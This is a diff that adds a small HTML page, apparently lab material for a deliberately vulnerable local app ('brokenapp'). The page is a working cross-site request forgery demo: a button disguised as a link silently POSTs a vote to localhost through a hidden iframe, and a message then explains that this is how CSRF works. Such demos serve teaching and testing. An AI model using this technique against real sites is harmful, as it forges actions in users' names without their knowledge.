@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    form {
+      margin-bottom: 2em;
+    }
+    .link-button {
+      background: none;
+      border: none;
+      color: blue;
+      text-decoration: underline;
+      cursor: pointer;
+      font-size: 1em;
+      font-family: serif;
+    }
+    .link-button:focus {
+      outline: none;
+    }
+    .link-button:active {
+      color:red;
+    }
+    #voted-msg {
+      margin-bottom: 2em;
+    }
+  </style>
+
+  <script>
+    function showMsg() {
+      const msg = document.getElementById("voted-msg")
+      msg.style.visibility = "visible"
+    }
+  </script>
+</head>
+
+<body>
+  <!-- Dummy to intercept the response received after submitting the form -->
+  <iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
+
+  <!-- The response to this post request will be a redirect -->
+  <form method="post" action="http://localhost:8000/brokenapp/1/vote/" target="dummyframe">
+    <button type="submit" name="choice" value="3" class="link-button"
+      onclick="showMsg()"
+    >
+      This is a link that sends a POST request
+    </button>
+  </form>
+
+  <div id="voted-msg" style="visibility: hidden">
+    Your vote should have been taken into account.<br>
+    This is how CSRF works.
+  </div>
+</body>
+</html> 
